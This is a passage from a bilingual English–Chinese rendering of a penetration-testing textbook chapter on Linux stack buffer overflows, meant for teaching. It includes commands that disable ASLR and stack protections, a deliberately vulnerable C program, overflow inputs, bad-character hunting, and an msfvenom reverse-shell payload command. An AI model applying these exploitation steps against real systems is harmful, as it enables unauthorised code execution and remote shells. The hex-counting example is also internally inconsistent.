    Kali 或 BackTrack）来查看漏洞的实际表现。不管怎样，我们将在[*第12章*](B17616_12_Final_VK_ePub.xhtml#_idTextAnchor224)中攻击
    Windows 系统，*Shellcoding - 绕过杀毒软件*。
- en: 'Before we start, we need to disable the stack protections built into Linux.
    Part of what makes stack overflows possible is being able to predict and manipulate
    memory addresses. However, **Address Space Layout Randomization** (**ASLR**) makes
    this harder, as it’s tough to predict something that’s being randomized. We’ll
    discuss bypass methods later, but for the purposes of our demonstration, we’re
    going to temporarily disable it with the following command:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始之前，需要禁用 Linux 内置的栈保护机制。栈溢出之所以可能，部分原因是能够预测和操作内存地址。然而，**地址空间布局随机化**（**ASLR**）使得这一点变得更困难，因为很难预测被随机化的内容。我们稍后会讨论绕过方法，但为了演示目的，我们将通过以下命令暂时禁用它：
- en: echo 0 > /proc/sys/kernel/randomize_va_space
  id: totrans-76
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: echo 0 > /proc/sys/kernel/randomize_va_space
- en: 'Walk before You Run: Disabling Protections'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 走之前先学会走路：禁用保护机制
- en: It’s important to understand the fundamentals of stack overflows, so we’re using
    this chapter and the next to create an ideal attack lab that is educational but
    unlikely to represent your actual clients’ environments. The industry has learned
    from what we’re discussing here, and today you’re going to run into protections
    such as ASLR and DEP. Stay tuned for [*Chapter 11*](B17616_11_Final_VK_ePub.xhtml#_idTextAnchor205),
    *Shellcoding - Bypassing Protections*, to get an up-to-date feel for how these
    attacks work. By then, you’ll have a historical perspective and the conceptual
    understanding to inform your studies outside of this book.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 理解栈溢出的基本原理非常重要，因此我们使用本章和下一章来创建一个理想的攻击实验室，这既具教育意义，又不太可能代表你实际客户的环境。业内已经从我们讨论的内容中吸取了教训，今天你会遇到诸如
    ASLR 和 DEP 这样的保护机制。请继续关注[*第 11 章*](B17616_11_Final_VK_ePub.xhtml#_idTextAnchor205)，*Shellcoding
    - 绕过保护*，以便了解这些攻击如何工作，获取最新的实践经验。到那时，你将有历史的视角和概念性理解，来指导你在本书之外的学习。
- en: 'Now, let’s use our trusty nano to type up a quick (and vulnerable) C program,
    as follows:'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们使用我们 trusty 的 nano 来快速编写一个简单（且易受攻击的）C程序，代码如下：
- en: nano demo.c
  id: totrans-80
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: nano demo.c
- en: 'As we type this out, let’s take a look at our vulnerable code:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们输入这些时，先来看看我们的易受攻击的代码：
- en: '![Figure 10.3 – Editing our program in nano ](image/Figure_10.3_B17616.jpg)'
  id: totrans-82
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.3 – 在 nano 中编辑我们的程序](image/Figure_10.3_B17616.jpg)'
- en: Figure 10.3 – Editing our program in nano
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.3 – 在 nano 中编辑我们的程序
- en: The program starts with the preprocessing directive, **#include**, which tells
    the program to include the defined header file. Here, **stdio.h** is the header
    file that defines variable types for standard input and output. The program sets
    up the **main** function, which returns nothing (hence **void**); the **buffer** variable
    is declared and set at **300** bytes in size; the **strcpy** (string copy) command
    copies the argument passed to the program into the **300** byte buffer; a message
    from a classic movie on robotics is displayed; and the function ends.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 程序从预处理指令**#include**开始，告诉程序包含定义的头文件。在这里，**stdio.h** 是定义标准输入输出变量类型的头文件。程序设置了**main**函数，返回值为无（因此是**void**）；**buffer**变量被声明并设置为300字节大小；**strcpy**（字符串拷贝）命令将传递给程序的参数复制到300字节的缓冲区；显示了一句经典电影中的机器人台词；最后，函数结束。
- en: 'Now, we’ll compile our program. Note that we’re also disabling stack protections
    during compilation in the following example:'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们来编译我们的程序。请注意，在以下示例中，我们还在编译时禁用了栈保护：
- en: gcc -g -fno-stack-protector -z execstack -o demo demo.c
  id: totrans-86
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: gcc -g -fno-stack-protector -z execstack -o demo demo.c
- en: ./demo test
  id: totrans-87
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: ./demo test
- en: 'When you run the program, you should see the output from **printf** as expected:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 当你运行程序时，应该能看到**printf**输出的结果，正如预期的那样：
- en: '![Figure 10.4 – Running our demo program ](image/Figure_10.4_B17616.jpg)'
  id: totrans-89
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.4 – 运行我们的演示程序](image/Figure_10.4_B17616.jpg)'
- en: Figure 10.4 – Running our demo program
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.4 – 运行我们的演示程序
- en: 'We can now see that the demo program took **test** as input and copied it to
    the buffer. The **printf** function then displays our message. The input is small,
    so we shouldn’t expect any issues; it fits in the buffer with room to spare. Let’s
    take a look at what happens if we hold down the *z* key for a while before submitting
    the input:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以看到演示程序将**test**作为输入并将其复制到缓冲区。然后，**printf**函数显示我们的消息。由于输入很小，因此我们不应该遇到任何问题；它完全适应缓冲区，甚至还有空余的空间。让我们看看如果我们按住*z*键一段时间再提交输入，会发生什么：
- en: '![Figure 10.5 – Demo program crash ](image/Figure_10.5_B17616.jpg)'
  id: totrans-92
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.5 – 演示程序崩溃](image/Figure_10.5_B17616.jpg)'
- en: Figure 10.5 – Demo program crash
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.5 – 演示程序崩溃
- en: Ah-ha! There’s a *segmentation fault*. The program has been broken because we
    put in too much data. The program is simple and quite literally does nothing,
    but still has a **main** function. At some point, this function is called where
    a buffer is set aside for it. Once everything is popped back off the stack, we’ll
    be left with a return pointer. If this points to somewhere invalid, the program
    crashes. Now let’s load our program into GDB and see what’s going on behind the
    curtain.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 啊哈！这里发生了*段错误*。程序崩溃了，因为我们输入了过多的数据。这个程序很简单，字面上几乎什么也不做，但仍然有一个**main**函数。在某个时刻，这个函数会被调用，并为其分配一个缓冲区。一旦栈上的所有内容被弹出，我们将剩下一个返回指针。如果这个指针指向一个无效地址，程序就会崩溃。现在，让我们把程序加载到
    GDB 中，看看幕后发生了什么。
- en: Examining the stack and registers during execution
  id: totrans-95
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 执行过程中检查栈和寄存器
- en: 'We’ll issue the **run** command with our initial **test** input and then examine
    the registers to see what the normal operation looks like, as follows:'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用初始**测试**输入发出**run**命令，然后检查寄存器，看看正常操作的样子，如下所示：
- en: gdb demo
  id: totrans-97
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: gdb 演示
- en: (gdb) break 6
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: (gdb) break 6
- en: (gdb) run test
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: (gdb) run test
- en: (gdb) info registers
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: (gdb) info registers
- en: 'This will give us a nice map of the registers:'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 这将为我们提供寄存器的清晰映射：
- en: '![Figure 10.6 – Register map in GDB ](image/Figure_10.6_B17616.jpg)'
  id: totrans-102
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.6 – GDB 中的寄存器映射](image/Figure_10.6_B17616.jpg)'
- en: Figure 10.6 – Register map in GDB
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.6 – GDB 中的寄存器映射
- en: As we can see in the preceding screenshot, **esp** and **ebp** are right next
    to each other, and so, now we can figure out the stack frame. Working from **esp**,
    let’s find the return address. Remember, it’ll be the first hexadecimal word after
    the base pointer. We know that we start at **esp**, but how far do we look in
    memory? Let’s review the math.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 如我们在前面的截图中看到的，**esp** 和 **ebp** 紧挨在一起，因此现在我们可以确定栈帧。从**esp**开始，让我们找到返回地址。记住，它将是基指针之后的第一个十六进制字。我们知道我们从**esp**开始，但我们要在内存中查找多远呢？让我们来回顾一下计算。
- en: The stack pointer is at **0xbffff470**, and the base pointer is at **0xbfff5a8**.
    This means we can eliminate **bfff**, so we’re counting hexadecimal words from
    **470** to **5a8**. An easy way to think of this is by counting groups of 16: **220**,
    **230**, **240**, **250**, and so on, up to **360**, which is 20 groups. Therefore,
    we’ll examine 80 hexadecimal words. If you thought that was 14 groups rather than
    20, you’re probably stuck in base-10 mode. Remember we’re in base-16, meaning **220**,
    **230**, **240**, **250**, **260**, **270**, **280**, **290**, **2a0**, **2b0**,
    **2c0**, and so on.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 栈指针位于**0xbffff470**，基指针位于**0xbfff5a8**。这意味着我们可以排除**bfff**，所以我们从**470**到**5a8**数十六进制字。一个简单的思考方式是按16个一组来数：**220**，**230**，**240**，**250**，依此类推，一直到**360**，共20组。因此，我们将检查80个十六进制字。如果你觉得这是14组而不是20组，那你可能还是在用十进制模式。记住，我们使用的是十六进制，这意味着**220**，**230**，**240**，**250**，**260**，**270**，**280**，**290**，**2a0**，**2b0**，**2c0**，等等。
- en: 'Now we know we’re examining 80 hexadecimal words, let’s pass this command to
    GDB:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道我们正在检查80个十六进制字，接下来让我们向 GDB 发出这个命令：
- en: (gdb) x/80x $esp
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: (gdb) x/80x $esp
- en: 'If you find the base pointer address and then identify the hexadecimal word
    right after it, you will get the return address, as shown in the following screenshot:'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你找到了基指针地址并识别出它之后的十六进制字，你将得到返回地址，如下所示的截图所示：
- en: '![Figure 10.7 – The return address highlighted ](image/Figure_10.7_B17616.jpg)'
  id: totrans-109
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.7 – 高亮显示返回地址](image/Figure_10.7_B17616.jpg)'
- en: Figure 10.7 – The return address highlighted
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.7 – 高亮显示返回地址
- en: 'Examine this until it makes sense. Then, use **quit** to exit so we can do
    the same procedure over again. This time, we will crash our program with a long
    string of the letter **z**, as shown in the following command:'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 仔细检查直到理解为止。然后，使用**quit**命令退出，以便我们可以再次执行相同的步骤。这一次，我们将用一长串字母**z**使程序崩溃，如下所示的命令所示：
- en: gdb demo
  id: totrans-112
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: gdb 演示
- en: (gdb) break 6
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: (gdb) break 6
- en: (gdb) run $(python -c 'print "z"*400')
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: (gdb) run $(python -c 'print "z"*400')
- en: 'Ahh! What have we done? Take a look at the memory address the function is trying
    to jump to, shown in the following screenshot:'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 啊！我们做了什么？看看函数试图跳转的内存地址，如下截图所示：
- en: '![Figure 10.8 – Taking a look at where the program tried to send execution
    ](image/Figure_10.8_B17616.jpg)'
  id: totrans-116
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.8 – 查看程序试图发送执行的位置](image/Figure_10.8_B17616.jpg)'
- en: Figure 10.8 – Taking a look at where the program tried to send execution
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.8 – 查看程序试图发送执行的位置
- en: As you can see, if you run **x/80x $esp** as you did before, you’ll see the
    stack again. Find the base pointer, then read the hexadecimal word after it. It
    now says **0x7a7a7a7a**. **7a** is the hexadecimal representation of the ASCII
    **z**. We overflowed the buffer and replaced the return address! Our computer
    is very angry with us about this because **0x7a7a7a7a** either doesn’t exist or
    we have no business jumping there. Before we move on to turn this into a working
    attack, we need to make sure we understand the order of bits in memory.
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，如果你像之前一样运行**x/80x $esp**，你将再次看到栈。找到基指针，然后读取它之后的十六进制字。现在显示的是**0x7a7a7a7a**。**7a**是ASCII字符**z**的十六进制表示。我们溢出了缓冲区并替换了返回地址！我们的计算机对此非常愤怒，因为**0x7a7a7a7a**要么不存在，要么我们没有权利跳转到那里。在将其转化为有效攻击之前，我们需要确保理解内存中的位顺序。
- en: Lilliputian concerns – understanding endianness
  id: totrans-119
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 小问题——理解字节序
- en: “It is computed that eleven thousand persons have at several times suffered
    death, rather than submit to break their eggs at the smaller end.”
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: “据计算，曾经有一万一千人多次死于非命，而不是屈服于在小端打破他们的蛋。”
- en: '*– Jonathan Swift, "Gulliver''s Travels"*'
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: '*– 乔纳森·斯威夫特，《格列佛游记》*'
- en: Take a break from the keyboard for a moment and enjoy a literary tidbit. In
    *Gulliver's Travels* by Jonathan Swift, published in 1726, our narrator and traveler Lemuel
    Gulliver talks of his adventure in the country of Lilliput. The Lilliputians are
    revealed to be a quirky bunch, known for deep conflict over seemingly trivial
    matters. For centuries, Lilliputians cracked open their eggs at the big end. When
    an emperor tried to enforce by law that eggs are to be cracked open at the little
    end, it resulted in rebellions, and many were killed.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 稍微离开键盘，享受一下文学趣闻。在乔纳森·斯威夫特于1726年出版的《格列佛游记》中，我们的叙述者和旅行者莱梅尔·格列佛讲述了他在利立浦特国的冒险。利立浦特人被揭示为一群古怪的人，以对看似微不足道的事情进行激烈的争论而闻名。几个世纪以来，利立浦特人总是从大端打破鸡蛋。当一位皇帝试图通过法律强制规定鸡蛋必须从小端打破时，导致了叛乱，许多人因此丧命。
- en: In the world of computing, it turns out that not everyone agrees on how bytes
    should be ordered in memory. If you spent a lot of time with networking protocols,
    you’ll be used to what is intuitive for people who read from left to right – *big-endian*,
    meaning the most significant bits are in memory first. With *little-endian*, the
    least significant bits go first. In layman’s terms, little-endian looks backwards.
    This is important for us as hackers because, like the Lilliputians, not everyone
    agrees with you on things you may otherwise consider trivial. As a shellcoder,
    and a reverser in particular, you should immediately get comfortable with little-endian
    ordering as it is the standard of Intel processors.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 在计算机世界中，事实证明并不是所有人都同意字节在内存中的排列顺序。如果你花了很多时间研究网络协议，你会习惯于对从左到右读取的直觉——*大端法*，即最重要的位先存储在内存中。而在*小端法*中，最不重要的位先存储。通俗来说，小端法看起来像是倒着来的。对于我们这些黑客来说，这一点非常重要，因为就像利立浦特人一样，并不是每个人都会在你认为微不足道的事情上和你意见一致。作为一个壳编码者，特别是一个逆向工程师，你应该立即适应小端排序，因为它是Intel处理器的标准。
- en: Let’s give a quick example using a hexadecimal word from memory. For example,
    let’s say you want **0x12345678** to appear in the stack. The string you’d pass
    to the overflowing function is **\x78\x56\x34\x12**. When your exploits fail,
    you’ll find yourself checking byte order before anything else as a troubleshooting
    step.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们通过使用内存中的十六进制单词给出一个简单的例子。比如说，假设你想让**0x12345678**出现在堆栈中。你传递给溢出函数的字符串将是**\x78\x56\x34\x12**。当你的漏洞利用失败时，你会发现自己首先检查字节顺序，作为故障排除的第一步。
- en: Now, we’re going to get into the wacky world of shellcoding. We previously mentioned
    that stuffing 400 bytes of the ASCII letter *z* into the buffer caused the return
    address to be overwritten with **0x7a7a7a7a**. What return address will we jump
    to if we execute the program with the following input?
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们将进入壳编码的奇异世界。我们之前提到，将400字节的ASCII字母*z*塞入缓冲区会导致返回地址被**0x7a7a7a7a**覆盖。如果我们用以下输入执行程序，我们将跳转到哪个返回地址？
- en: demo $(python -c 'print "\x7a"*300 + "\xef\xbe\xad\xde"')
  id: totrans-126
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: demo $(python -c 'print "\x7a"*300 + "\xef\xbe\xad\xde"')
- en: Keep the little-endian concept in mind and try this out before moving on to
    the next section.
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住小端法的概念，并在继续下一部分之前先进行尝试。
- en: Introducing shellcoding
  id: totrans-128
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 介绍壳编码
- en: If you played around with the last example in the previous section, you should
    have seen that execution tried to jump to **0xdeadbeef**. (We used **deadbeef** because
    it’s one of the few things you can say with hexadecimal characters. Besides, doesn’t
    it look like some sort of scary hacker moniker?) The point of this is to demonstrate
    that, by choosing the input carefully, you are able to control the return address.
    This means we can also pass shellcode as an argument and pad it to just the right
    size necessary to concatenate a return address to a payload, which will then return
    and result in its execution. This is essentially the heart of the stack overflow
    attack. However, as you can imagine, the return needs to point to a nice spot
    in memory. Before we tackle that, let’s get our hands on some bytes slightly more
    exciting than **deadbeef**.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你在上一节的最后一个示例中尝试过，你应该看到执行试图跳转到 **0xdeadbeef**。（我们使用 **deadbeef** 是因为它是你可以用十六进制字符表示的少数几个内容之一。而且，它看起来不就像某种可怕的黑客名字吗？）这儿的关键是展示通过精心选择输入，你能够**控制**返回地址。这意味着我们也可以将
    shellcode 作为参数传递，并将其填充到恰到好处的大小，以便连接返回地址到有效载荷中，然后返回并执行它。这本质上就是栈溢出攻击的核心。然而，正如你想象的那样，返回地址需要指向内存中的一个合适位置。在我们处理这个之前，让我们先获取一些比
    **deadbeef** 更激动人心的字节。
- en: Instead of generating the payload and passing it to some file that will be an
    input to **Metasploit** or **Shellter**, we actually want to get our hands on
    those naughty hexadecimal bytes. So, instead of outputting to an executable file,
    we’ll just output in a Python format and grab the values straight out of the terminal.
    You know where this is going, right? Yes, we’re going to use **msfvenom** to generate
    our payload. Go ahead and try it – use a Linux x86 payload, grab the bytes, and
    see if you can stuff the buffer and overwrite the return address.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 我们不打算生成有效载荷并将其传递给将作为 **Metasploit** 或 **Shellter** 输入的文件，而是希望直接获取这些顽皮的十六进制字节。因此，我们不会将其输出到可执行文件，而是以
    Python 格式输出，并直接从终端获取这些值。你知道接下来会发生什么，对吧？是的，我们将使用 **msfvenom** 来生成有效载荷。试试看吧——使用
    Linux x86 有效载荷，获取字节，看看能否填满缓冲区并覆盖返回地址。
- en: It didn’t work, did it? You can see the first handful of your payload’s bytes,
    but then it seems to break into zeros and a few other memory references here and
    there. We mentioned *bad characters* when we first introduced **msfvenom** – hexadecimal
    bytes that will actually break execution for some reason. The infamous example
    is **\x00**, the null byte. If you tried using the example from the **msfvenom** help
    screen – **'\x00\xff'** – that’s a good guess, but it probably didn’t work either.
    So, our only option is to go hunting in the hexadecimal jungle to find the bytes
    that are breaking our shellcode.
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 它没有成功，对吧？你可以看到有效载荷的前几个字节，但接下来似乎会变成零并且有一些其他的内存引用在各处。我们在第一次介绍 **msfvenom** 时提到了
    *坏字符* —— 实际上会破坏执行的十六进制字节。臭名昭著的例子是 **\x00**，空字节。如果你尝试使用 **msfvenom** 帮助屏幕上的示例 ——
    **'\x00\xff'** —— 这算是一个不错的猜测，但它可能也没有成功。因此，我们唯一的选择就是在十六进制的丛林中进行猎寻，找到那些破坏我们 shellcode
    的字节。
- en: How do we do that without going byte-by-byte in our shellcode? Thankfully, there’s
    a nifty workaround.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 我们如何在不逐字节检查 shellcode 的情况下完成这项任务呢？幸运的是，有一个巧妙的解决方法。
- en: Hunting bytes that break shellcode
  id: totrans-133
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 猎寻破坏 shellcode 的字节
- en: What’s nice about our broken shellcode problem is that the culprits are just
    a byte each. A single byte is just two hexadecimal digits, so there can only be
    a total of *16 * 16 = 256* characters to review. This sounds like a lot to go
    through manually, but we already have our target executable demo, and we have
    GDB. So, why not pass all 256 characters (our hunting payload) as a single argument
    with a *target* sequence at the end and see if our pad makes it to the stack?
    If it doesn’t, we know the code broke somewhere and we can step through byte-by-byte
    to find the break. When it breaks, remove the offending character – then rinse
    and repeat.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的破损 shellcode 问题的好处在于，罪魁祸首每次只是一个字节。一个字节只有两个十六进制数字，所以总共有 *16 * 16 = 256* 个字符需要检查。手动检查这些似乎有点多，但我们已经有了目标可执行文件演示，并且我们也有
    GDB。那么，为什么不将所有 256 个字符（我们的猎寻有效载荷）作为一个参数传递，并在末尾加上一个 *target* 序列，看看我们的填充是否能到达堆栈呢？如果没有，我们就知道代码在某个地方断开了，然后可以逐字节调试，找到断点。当断开时，删除有问题的字符，然后反复操作。
- en: 'Let’s take a look at our example. Note that I’m using 4 bytes of **\x90** as
    fluff:'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来看看这个示例。请注意，我使用了 4 字节的**\x90**作为填充：
- en: '![Figure 10.9 – Using GDB to find breaks in the shellcode ](image/Figure_10.9_B17616.jpg)'
  id: totrans-136
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.9 – 使用 GDB 查找 shellcode 中的断点](image/Figure_10.9_B17616.jpg)'
- en: Figure 10.9 – Using GDB to find breaks in the shellcode
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.9 – 使用 GDB 查找 shellcode 中的中断
- en: 'Let’s examine this output more closely:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们更仔细地检查这个输出：
- en: We can easily see our 4 bytes of fluff in the next word in memory – **0x90909090**.
    Therefore, we expect the *next* word in memory to be the beginning of our hunting
    payload; the first four bytes are 01, 02, 03, and 04\. This is little-endian,
    so we expect **0x04030201**.
  id: totrans-139
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 我们可以很容易地在内存中的下一个位置看到我们的 4 个填充字节——**0x90909090**。因此，我们预计内存中的*下一个*单词应该是我们搜索载荷的开始；前四个字节是
    01、02、03 和 04。由于是小端格式，我们预计是**0x04030201**。
- en: We see the expected word at the next location in memory, so now let’s just hunt
    for a break. We know the following words should look like this – **0x08070605**,
    **0x0c0b0a09**, and so on.
  id: totrans-140
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 我们在内存的下一个位置看到了预期的单词，所以现在让我们开始寻找中断。我们知道接下来的单词应该是这样的——**0x08070605**，**0x0c0b0a09**，以此类推。
- en: Hark! Instead of the continuation of our hunting payload, we find **0xb7fcc100**.
    That looks a lot like a location in the memory. Regardless, we see that **\x08**
    was the last byte in our sequence that made it to the stack.
  id: totrans-141
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 嘿！我们发现**0xb7fcc100**，而不是我们搜索载荷的继续部分。那看起来很像内存中的一个位置。不管怎样，我们看到**\x08**是我们序列中最后一个成功进入堆栈的字节。
- en: Thus, we can now infer that **\x09** broke the code.
  id: totrans-142
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 因此，我们现在可以推断出**\x09**是破坏代码的字符。
- en: Now we take out the offending character and run through it again with the modified
    hunting payload – this is the *rinse and repeat* part. Eventually, if we get to
    the end and see our target sequence, we know that our characters are good. In
    this example, we’ve used **\x7a** as the target. Now let’s jump ahead to the moment
    when I finally pass a hunting payload that’s devoid of bad characters.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们移除有问题的字符，并用修改后的搜索载荷再次运行——这就是*反复操作*的部分。最终，如果我们到达结尾并看到目标序列，我们就知道我们的字符是有效的。在这个例子中，我们使用**\x7a**作为目标。现在，让我们跳到当我最终通过一个没有坏字符的搜索载荷时的时刻。
- en: 'When I find that telltale 4 bytes of **\x7a**, I know we’ve made it to the
    end:'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 当我发现那四个标志性的**\x7a**字节时，我知道我们已经到达了终点：
- en: '![Figure 10.10 – Proof of concept: the shellcode contains no bad characters
    ](image/Figure_10.10_B17616.jpg)'
  id: totrans-145
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.10 – 概念验证：shellcode 不包含坏字符](image/Figure_10.10_B17616.jpg)'
- en: 'Figure 10.10 – Proof of concept: the shellcode contains no bad characters'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.10 – 概念验证：shellcode 不包含坏字符
- en: You might be wondering if it’s possible to search for bad characters online.
    This will inform you of consistent offenders, such as **\x00**. However, this
    is something that can vary from system to system. Regardless, this is a valuable
    exercise because you are gaining experience and intimacy with the target.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能会想，是否可以在线查找坏字符。这将帮助你发现一些常见的恶性字符，比如**\x00**。然而，这在不同系统之间可能会有所不同。不管怎样，这个过程是有价值的，因为你正在获得与目标的经验和熟悉度。
- en: Generating shellcode with msfvenom
  id: totrans-148
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用 msfvenom 生成 shellcode
- en: 'Now that we know what characters break our shellcode, we can issue our **msfvenom**
    command to grab a payload, as follows:'
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们知道了哪些字符会破坏我们的 shellcode，我们可以发出我们的**msfvenom**命令来抓取一个载荷，如下所示：
- en: msfvenom --payload linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=45678 --format
    py --bad-chars '\x00\x09\x0a\x20\xff'
  id: totrans-150
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom --payload linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=45678 --format
    py --bad-chars '\x00\x09\x0a\x20\xff'
- en: 'What you do with the output is up to you. You could dump it into a Python script
    that you’d call as an argument when you run the vulnerable program. In the following
    example, we’ve dumped it straight into a single command for ease:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 你如何处理输出完全取决于你。你可以将其转储到一个 Python 脚本中，并在运行易受攻击的程序时作为参数调用。在以下例子中，我们将它直接转储到一个简单命令中以便操作：
- en: '![Figure 10.11 – Using Python to stuff the buffer with shellcode ](image/Figure_10.11_B17616.jpg)'
  id: totrans-152
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.11 – 使用 Python 将缓冲区填充上 shellcode](image/Figure_10.11_B17616.jpg)'
- en: Figure 10.11 – Using Python to stuff the buffer with shellcode
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.11 – 使用 Python 将缓冲区填充上 shellcode
- en: Here we see a *proof of concept* – all of that gunk is sanitized payload with
    the return memory overwrite concatenated at the end. This proves that the code
    didn’t break because you can see the segmentation fault **Cannot access memory** at
    the defined location. If the code actually works and we point the memory address
    at a location that takes the flow to the top of the shellcode, then we’re golden.
    There’s just one trick left, however, and that’s pointing at the exact point in
    memory where the shellcode lies, which is about as tough as it sounds. Did you
    notice the padding at the front of the shellcode? It is 150 bytes of **\x90**;
    unlike the letter *z*, that is not arbitrary.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里我们看到一个*概念验证*——所有这些垃圾数据都是经过清理的有效负载，返回内存覆盖被附加在末尾。这证明了代码没有崩溃，因为你可以看到在定义的位置发生了段错误**无法访问内存**。如果代码实际上能够正常工作，并且我们将内存地址指向一个能够将执行流带到
    shellcode 顶部的位置，那么我们就成功了。然而，还有一个难题，那就是准确地指向内存中 shellcode 所在的位置，这个问题难度大得出乎意料。你注意到
    shellcode 前面的填充了吗？它是 150 字节的**\x90**；不同于字母 *z*，这并不是随意的。
- en: Grab your mittens, we’re going NOP sledding
  id: totrans-155
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 戴上手套，我们要去玩 NOP 滑道了
- en: 'The processor doesn’t have to work all the time. After all, we all need a break
    now and then. The processor will always do as it is told, and it just so happens
    that we can tell it to *not* do anything. If we tell our processor to conduct
    no operations, this instruction is called a **NOP**. To get an idea of how this
    helps us, let’s take a look at the following stack structure:'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 处理器并不总是需要工作。毕竟，我们都需要休息一下。处理器总是按照指令执行，恰好我们可以告诉它*不*做任何事情。如果我们告诉处理器执行无操作，这条指令就叫做**NOP**。为了了解这如何帮助我们，让我们来看一下下面的堆栈结构：
- en: '![Figure 10.12 – How the attacker directs execution ](image/Figure_10.12_B17616.jpg)'
  id: totrans-157
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.12 – 攻击者如何指引执行流](image/Figure_10.12_B17616.jpg)'
- en: Figure 10.12 – How the attacker directs execution
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.12 – 攻击者如何指引执行流
- en: The entire red box is what we’re stuffing into the buffer. As you can see, it
    just won’t fit; it will *overflow* the buffer box into the space below, including
    the return address, which we will point to the middle of the NOP sled. The flow
    of execution will reach the return address and jump to there, thinking it’s returning
